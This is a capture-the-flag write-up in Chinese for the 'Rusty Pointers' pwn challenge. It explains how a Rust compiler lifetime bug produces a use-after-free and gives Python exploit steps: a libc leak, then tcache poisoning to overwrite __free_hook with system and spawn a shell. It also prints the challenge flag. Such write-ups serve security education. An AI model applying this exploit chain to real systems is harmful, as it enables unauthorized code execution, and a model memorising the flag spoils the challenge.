# Rusty Pointers

## 题目简述

题目用 Rust 实现 64 字节 Note/Rule 管理器，却借助旧版编译器的生命周期推断缺陷，在没有显式 `unsafe` 块的情况下制造悬空可变引用。`Box` 仍使用 glibc 分配器，附件固定为 Ubuntu 20.04 的 glibc 2.31，因此可以把 Rule 的 UAF 转化为 tcache poisoning，覆盖 `__free_hook` 并执行 `system`。

## 解题过程

`get_rule` 在局部创建 `Box<[u8;64]>`，再通过 `get_ptr` 把借用伪装成任意生命周期，调用者最终把它当作 `&'static mut` 保存。函数返回时原 Box 正常析构并释放 0x50 大小类的块，但 Rule 仍指向该块，形成可读写 UAF。问题来自 `ident` 函数指针与全局 `S: &&()` 共同诱导出的错误生命周期泛化，并不是 Rust 源码中常见的裸指针越界。

先选择 `Make a Law`。2000 字节 Box 释放后进入 unsorted bin，悬空 Law 随即读取块首的 `fd/bk`，得到 main arena 指针。对随题 libc，第一项减去 `0x1ecbe0` 即为 libc 基址：

```python
leak = make_law()
libc.address = leak - 0x1ECBE0
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
```

接着创建两个 Note，再连续两次删除索引 0。由于第一次删除后第二个元素移动到索引 0，最终两个 0x50 块都进入 tcache。创建 Rule 时，`get_rule` 取出链首块、清零、返回前又释放它，所以 tcache 链表形状基本不变，而 Rule 持有链首空闲块的悬空引用。

glibc 2.31 尚未对 tcache `next` 使用 safe-linking。编辑 Rule，把空闲块用户区首 8 字节改成 `__free_hook` 地址；随后创建两个 Note，第一次取回真实空闲块，第二次便让 Box 指向 `__free_hook`。完整关键序列为：

```python
make_note()
make_note()
del_note(0)
del_note(0)

make_rule()
edit_rule(0, p64(free_hook))

make_note()  # 取回原 tcache 块，成为 note[0]
make_note()  # 返回 __free_hook，成为 note[1]
edit_note(0, b"/bin/sh\0")
edit_note(1, p64(system))

del_note(0)  # free("/bin/sh") -> system("/bin/sh")
```

进入 shell 后读取 `flag.txt`：

```text
uiuctf{who_knew_if_my_pointers_lived_forever_they_would_rust???}
```

## 方法总结

- Rust 的内存安全依赖编译器正确执行生命周期约束；本题刻意利用旧编译器漏洞，把局部 Box 析构后的地址伪装成 `'static` 引用。
- Law 使用 unsorted-bin 大块提供 libc 泄漏，Rule 使用 0x50 tcache 块提供 UAF 写，两种对象承担不同原语。
- 利用依赖题目随附的 glibc 2.31：存在 `__free_hook` 且 tcache 未启用 safe-linking。换到新版本后，目标与指针编码策略都必须重做。
